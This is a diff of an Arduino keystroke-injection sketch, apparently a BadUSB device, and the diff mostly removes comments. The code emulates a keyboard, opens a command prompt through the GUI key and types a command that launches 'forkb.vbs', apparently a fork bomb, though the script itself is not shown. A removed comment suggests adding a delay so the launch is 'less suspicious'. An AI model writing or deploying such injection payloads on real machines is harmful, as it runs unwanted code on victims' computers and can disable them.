@@ -7,13 +7,10 @@ void typeKey(int key)
   Keyboard.release(key);
 }
 
-/* Init function */
 void setup()
 {
-  // Begining the Keyboard stream
   Keyboard.begin();
 
-  // Wait 500ms (You should set more delay time if your computer is slow or if the script doesn't work correctly)
   delay(500);
 
   Keyboard.press(KEY_LEFT_GUI);
@@ -49,14 +46,10 @@ void setup()
   typeKey(KEY_RETURN);
 
   Keyboard.print("start forkb.vbs && exit");
-  /* You can add this: ">null ping localhost -n 5 && " before "start" to make a (5 sec) delay before the vbs execution.
-  (By this way it's less suspicious) */
   
   typeKey(KEY_RETURN);
 
-  // Ending stream
   Keyboard.end();
 }
 
-/* Unused endless loop */
 void loop() {}
